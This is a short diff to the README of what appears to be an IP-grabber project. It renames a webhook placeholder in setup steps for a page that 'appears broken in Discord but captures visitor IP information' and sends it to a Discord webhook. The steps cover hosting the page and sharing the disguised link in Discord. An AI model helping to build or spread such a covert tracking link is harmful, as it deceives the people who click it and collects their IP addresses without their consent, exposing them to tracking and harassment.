@@ -5,7 +5,7 @@ Creates a link that appears broken in Discord but captures visitor IP informatio
 ## Setup
 
 1. Create a Discord webhook in your server
-2. Replace `YOUR_WEBHOOK_URL` in `index.html` with your webhook URL
+2. Replace `Discord_webhook_here` in `index.html` with your webhook URL
 3. Host the files on GitHub Pages or any web host
 4. Share the link in Discord
 
